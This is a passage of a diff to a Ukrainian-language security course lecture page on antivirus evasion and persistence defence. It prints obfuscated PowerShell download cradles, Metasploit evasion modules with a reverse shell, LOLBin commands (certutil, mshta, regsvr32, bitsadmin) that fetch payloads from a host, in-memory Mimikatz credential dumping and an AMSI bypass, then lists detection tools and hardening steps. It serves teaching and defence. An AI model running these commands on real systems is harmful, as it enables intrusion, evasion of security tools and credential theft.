+IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.50/payload.ps1')
+
+# String concatenation:
+$a='IEX (New-Ob'+'ject Net.We'+'bClient).Do'+'wnloadStr'+'ing(''http://192.168.1.50/p.ps1'')'
+iex $a
+
+# Encoding:
+[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('SQBFAFgA...'))
+
+# Char array:
+$c=[char[]](73,69,88,32,40,78,101,119,45,79); -join $c | iex
+
+# Variable substitution:
+${h`o`st}='192.168.1.50'; sal a New-Object; (a Net.WebClient).DownloadString("http://${h`o`st}/p.ps1") | iex</code></pre>
+
+        <h3>Metasploit Evasion Modules</h3>
+        <pre><code># Вбудовані evasion модулі
+msf6&gt; use evasion/windows/windows_defender_exe
+msf6 evasion(windows_defender_exe)&gt; set PAYLOAD windows/meterpreter/reverse_tcp
+msf6 evasion(windows_defender_exe)&gt; set LHOST 192.168.1.50
+msf6 evasion(windows_defender_exe)&gt; generate
+
+# Windows Defender JS evasion
+msf6&gt; use evasion/windows/windows_defender_js_hta</code></pre>
+      </section>
+
+      <!-- ============================================================ -->
+      <!-- 10.8 Сучасні техніки Evasion та захист                        -->
+      <!-- ============================================================ -->
+      <section>
+        <h2>10.8 Сучасні техніки Evasion та захист</h2>
+
+        <h3>Living Off the Land (LOTL)</h3>
+
+        <p>LOTL — використання легітимних інструментів ОС для шкідливих цілей. Оскільки інструменти підписані Microsoft, AV їх не блокує. MITRE ATT&CK: T1218.</p>
+
+        <table>
+          <tr>
+            <th>LOLBin</th>
+            <th>Легітимне використання</th>
+            <th>Зловживання</th>
+          </tr>
+          <tr>
+            <td><strong>PowerShell</strong></td>
+            <td>Адміністрування, скрипти</td>
+            <td>Download &amp; execute, in-memory payload</td>
+          </tr>
+          <tr>
+            <td><strong>certutil.exe</strong></td>
+            <td>Управління сертифікатами</td>
+            <td>Завантаження файлів, base64 decode</td>
+          </tr>
+          <tr>
+            <td><strong>mshta.exe</strong></td>
+            <td>HTML Applications</td>
+            <td>Виконання VBScript/JScript з URL</td>
+          </tr>
+          <tr>
+            <td><strong>regsvr32.exe</strong></td>
+            <td>Реєстрація COM DLL</td>
+            <td>Виконання коду через SCT файл з URL</td>
+          </tr>
+          <tr>
+            <td><strong>rundll32.exe</strong></td>
+            <td>Запуск функцій з DLL</td>
+            <td>Виконання шкідливих DLL</td>
+          </tr>
+          <tr>
+            <td><strong>wmic.exe</strong></td>
+            <td>WMI management</td>
+            <td>Виконання команд, process creation</td>
+          </tr>
+          <tr>
+            <td><strong>bitsadmin.exe</strong></td>
+            <td>Background transfers</td>
+            <td>Завантаження файлів</td>
+          </tr>
+          <tr>
+            <td><strong>msbuild.exe</strong></td>
+            <td>Build .NET projects</td>
+            <td>Виконання inline C# з XML</td>
+          </tr>
+        </table>
+
+        <pre><code># certutil — завантаження файлу
+certutil -urlcache -split -f http://192.168.1.50/payload.exe C:\Windows\Temp\update.exe
+
+# mshta — виконання з URL
+mshta http://192.168.1.50/payload.hta
+
+# regsvr32 — AppLocker bypass
+regsvr32 /s /n /u /i:http://192.168.1.50/file.sct scrobj.dll
+
+# PowerShell — download cradle
+powershell -w hidden -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.50/payload.ps1')"
+
+# bitsadmin
+bitsadmin /transfer job /download /priority high http://192.168.1.50/payload.exe C:\Windows\Temp\update.exe</code></pre>
+
+        <h3>In-Memory Execution (Fileless)</h3>
+
+        <p>Fileless malware — код виконується тільки в пам'яті, ніколи не торкається диску. Це обходить signature-based та більшість heuristic сканувань.</p>
+
+        <pre><code># PowerShell — завантаження та виконання в пам'яті
+powershell -w hidden -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.50/Invoke-Mimikatz.ps1'); Invoke-Mimikatz"
+
+# .NET Assembly.Load — завантаження .exe в пам'ять
+[System.Reflection.Assembly]::Load([System.Convert]::FromBase64String('TVqQAAMAA...'))
+
+# Meterpreter execute -m — in-memory execution
+meterpreter&gt; execute -H -m -d calc.exe -f /tmp/mimikatz.exe -a "sekurlsa::logonPasswords"</code></pre>
+
+        <h3>AMSI Bypass</h3>
+        <pre><code># AMSI bypass — патчинг amsi.dll у пам'яті
+# Це змінює AmsiScanBuffer() щоб завжди повертати AMSI_RESULT_CLEAN
+
+# Концептуальний приклад (варіації змінюються,
+# оскільки Microsoft додає сигнатури для bypass'ів):
+$a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
+$b = $a.GetField('amsiInitFailed','NonPublic,Static')
+$b.SetValue($null,$true)
+
+# Після bypass'у — AMSI не сканує подальші команди
+# Дозволяє запускати Invoke-Mimikatz, PowerView тощо
+
+# УВАГА: Microsoft постійно додає нові сигнатури для
+# AMSI bypass технік. Потрібна регулярна модифікація.</code></pre>
+
+        <h3>Sandbox Evasion</h3>
+        <p>Техніки виявлення sandbox-середовища для уникнення аналізу:</p>
+        <ul>
+          <li><strong>Timing checks</strong> — sandbox прискорює час; <code>Sleep(300000)</code> у sandbox пройде за секунди</li>
+          <li><strong>User interaction</strong> — перевірка руху миші, натискань клавіш</li>
+          <li><strong>Hardware checks</strong> — кількість CPU &lt; 2, RAM &lt; 2GB, disk &lt; 60GB → ймовірно sandbox</li>
+          <li><strong>VM detection</strong> — VMware Tools, VirtualBox Guest Additions, MAC-адреси</li>
+          <li><strong>Domain check</strong> — payload працює тільки в цільовому домені</li>
+          <li><strong>Process check</strong> — шукає wireshark.exe, procmon.exe, ollydbg.exe</li>
+        </ul>
+
+        <h3>Виявлення та захист від Persistence</h3>
+        <table>
+          <tr>
+            <th>Інструмент</th>
+            <th>Тип</th>
+            <th>Перевіряє</th>
+          </tr>
+          <tr>
+            <td><strong>Autoruns (Sysinternals)</strong></td>
+            <td>Windows</td>
+            <td>Усі точки автозапуску (реєстр, services, scheduled tasks, drivers)</td>
+          </tr>
+          <tr>
+            <td><strong>Process Monitor</strong></td>
+            <td>Windows</td>
+            <td>Real-time моніторинг файлової системи, реєстру, мережі</td>
+          </tr>
+          <tr>
+            <td><strong>Sysmon</strong></td>
+            <td>Windows</td>
+            <td>Розширене логування (process creation, network, file)</td>
+          </tr>
+          <tr>
+            <td><strong>osquery</strong></td>
+            <td>Cross-platform</td>
+            <td>SQL-запити до стану ОС (startup_items, crontab, users)</td>
+          </tr>
+          <tr>
+            <td><strong>YARA</strong></td>
+            <td>Cross-platform</td>
+            <td>Pattern matching для файлів та пам'яті</td>
+          </tr>
+          <tr>
+            <td><strong>chkrootkit / rkhunter</strong></td>
+            <td>Linux</td>
+            <td>Перевірка на відомі rootkits</td>
+          </tr>
+        </table>
+
+        <h3>Рекомендації з захисту</h3>
+        <ul>
+          <li><strong>EDR</strong> — розгорнути сучасний EDR з behavioral detection</li>
+          <li><strong>Application Whitelisting</strong> — дозволяти тільки підписані додатки (AppLocker, WDAC)</li>
+          <li><strong>PowerShell Constrained Language Mode</strong> — обмеження можливостей PowerShell</li>
+          <li><strong>Sysmon + SIEM</strong> — розширене логування та кореляція подій</li>
+          <li><strong>AMSI</strong> — увімкнути та підтримувати оновленим</li>
+          <li><strong>Credential Guard</strong> — захист LSASS від дампінгу (Windows 10+)</li>
+          <li><strong>Мінімальні привілеї</strong> — не працювати з правами адміністратора</li>
+          <li><strong>Network segmentation</strong> — обмеження lateral movement</li>
+          <li><strong>Periodic audits</strong> — регулярна перевірка Autoruns, scheduled tasks, services</li>
+        </ul>
       </section>
 
     </article>
 
     <div class="lecture-nav-bottom">
-      <a href="../lectures/9.html" class="nav-btn">&larr; Попередня</a>
-      <a href="../lectures/11.html" class="nav-btn">Наступна &rarr;</a>
+      <a href="9.html" class="nav-btn">&larr; Попередня</a>
+      <a href="11.html" class="nav-btn">Наступна &rarr;</a>
     </div>
 
     <footer id="site-footer"></footer>
